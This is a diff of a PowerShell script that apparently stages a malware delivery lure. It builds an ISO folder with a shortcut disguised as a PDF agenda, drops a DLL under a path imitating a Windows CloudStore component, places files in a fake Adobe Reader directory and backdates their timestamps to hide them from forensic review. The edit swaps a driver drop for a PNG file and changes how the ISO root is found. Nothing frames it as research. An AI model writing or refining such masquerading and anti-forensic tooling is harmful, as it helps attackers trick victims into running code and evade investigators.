@@ -1,4 +1,5 @@
-$IsoRoot = "C:\tmp\SHARE_1\DocShare"
+# Run from inside the DocShare ISO folder (same cwd model as ts.ps1 / newIMG.ps1).
+$IsoRoot = (Get-Location).ProviderPath
 $VolumeName = "DocShare"
 $LnkPath = Join-Path $IsoRoot "Agenda_15-19_6-2026.pdf.lnk"
 $CleanupPath = Join-Path $IsoRoot "Microsoft\DocShare.ps1"
@@ -53,7 +54,7 @@ do {
     $pdfDst = Join-Path $pdfDir 'Agenda_15-19_6-2026.pdf'
     $imgDst = Join-Path $pdfDir 'DocShare.img'
     $dllDrop = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\CloudStore\Shell\Windows.CloudStore.Schema.Shell.dll'
-    $sysDrop = Join-Path $env:ProgramData 'Adobe\ARM\Reader_26.001.21563\Library\Drivers\amd64.sys'
+    $pngDrop = Join-Path $env:ProgramData 'Adobe\ARM\Reader_26.001.21563\Downloads\Agenda_15-19_6-2026.png'
 
     try {
         if (-not (Test-Path -LiteralPath $pdfDir)) {
@@ -62,7 +63,7 @@ do {
         Copy-Item -LiteralPath $pdfSrc -Destination $pdfDst -Force -ErrorAction Stop
     } catch { }
 
-    Apply-StampTimes -Paths @($pdfDst, $dllDrop, $sysDrop)
+    Apply-StampTimes -Paths @($pdfDst, $dllDrop, $pngDrop)
 
     try {
         $shell = New-Object -ComObject Shell.Application
